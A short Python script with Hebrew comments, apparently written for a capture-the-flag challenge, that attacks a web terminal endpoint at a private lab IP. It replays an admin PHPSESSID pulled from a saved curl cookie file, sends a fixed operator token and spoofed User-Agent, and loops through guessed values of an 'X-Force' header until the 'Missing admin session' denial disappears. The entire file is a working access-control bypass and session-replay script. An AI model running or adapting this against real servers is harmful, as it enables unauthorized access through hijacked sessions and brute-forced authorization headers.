import requests
import sys

# --- הגדרות (תעדכן את ה-IP אם השתנה) ---
ip = "10.66.186.152" 
url = f"http://{ip}/terminal.php?action=close"
token = "f86402a3dcd3cf82ab23ce475ab8fdbd532060ac073b3294eb3195ae1d9712af"
cookie_file = "admincookie.txt"  # הקובץ שבו שמרת את ה-Session שלך

# רשימת ערכים אפשריים ל-X-Force
# (מתחילים מהנפוצים ביותר ב-CTF וממשיכים לניחושים)
force_values = [
    "true", "1", "yes", "on", "enable", "force", 
    "admin", "root", "4731", "open", "close", 
    "please", "token", "master", "override"
]

print(f"[*] Attacking X-Force header on {url}")
print(f"[*] Using Token: {token[:10]}...")

# טעינת העוגייה מהקובץ
try:
    with open(cookie_file, 'r') as f:
        cookie_content = f.read()
        # מנסה לפרק את קובץ ה-Netscape של CURL למילון פייתון
        # (פתרון מהיר: פשוט נשלח את זה כ-Header של Cookie אם הפורמט מסובך, אבל ננסה להשתמש ב-requests session)
        print("[*] Cookie file loaded.")
except FileNotFoundError:
    print(f"[!] Error: Could not find {cookie_file}. Make sure you generated it!")
    sys.exit()

# יצירת Session בפייתון כדי לטעון את העוגיות ידנית או דרך ה-Header
s = requests.Session()
# נבנה את העוגייה ידנית מהקובץ או נשתמש בפורמט פשוט. 
# לצורך הפשטות, נניח שהקובץ הוא בפורמט CURL, נשתמש בשיטה בטוחה יותר:
# נחפש את ה-PHPSESSID בתוך הקובץ
import re
match = re.search(r'PHPSESSID\s+(\w+)', cookie_content)
if match:
    session_id = match.group(1)
    cookies = {'PHPSESSID': session_id}
    print(f"[*] Extracted Session ID: {session_id}")
else:
    print("[!] Could not extract PHPSESSID from file. Check file format.")
    sys.exit()

# --- הלולאה ---
for val in force_values:
    # הכותרות לבקשה
    headers = {
        "User-Agent": "secretcomputer",
        "X-Operator": token,
        "X-Force": val
    }
    
    try:
        # שליחת הבקשה
        r = s.post(url, headers=headers, cookies=cookies, timeout=3)
        
        # אם התשובה *לא* מכילה את השגיאה הרגילה על "Missing..."
        if "Missing admin session" not in r.text:
            print(f"\n[!!!] BINGO! X-Force value found: {val}")
            print("="*40)
            print(r.text)
            print("="*40)
            sys.exit()
        else:
            print(f"Trying X-Force: {val} ... (Denied)")
            
    except Exception as e:
        print(f"Error on {val}: {e}")

print("\n[x] Failed. None of the values worked.")
print("Reminder: If X-Force is correct but the Session is wrong, the server will STILL give the same error.")
